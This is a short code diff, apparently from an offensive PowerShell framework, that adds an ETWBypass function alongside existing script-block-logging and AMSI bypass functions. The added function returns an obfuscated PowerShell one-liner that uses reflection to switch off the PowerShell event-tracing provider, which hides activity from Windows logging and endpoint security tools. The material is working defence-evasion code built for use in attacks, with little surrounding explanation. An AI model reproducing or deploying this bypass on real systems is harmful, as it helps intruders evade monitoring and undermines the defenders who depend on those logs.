@@ -26,6 +26,10 @@ def scriptBlockLogBypass():
     bypass += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
     return bypass
 
+def ETWBypass():
+    #tandasat killetw.ps1
+    bypass = "[System.Diagnostics.Eventing.EventProvider].\"GetFie`ld\"('m_e'+'nabled','Non'+'Public,'+'Instance').SetValue([Ref].Assembly.GetType('Syste'+'m.Management.Automation.Tracing.PSE'+'twLogProvider').\"GetFie`ld\"('et'+'wProvider','NonPub'+'lic,S'+'tatic').GetValue($null),0);"
+    return bypass
 
 def AMSIBypass():
     # @mattifestation's AMSI bypass
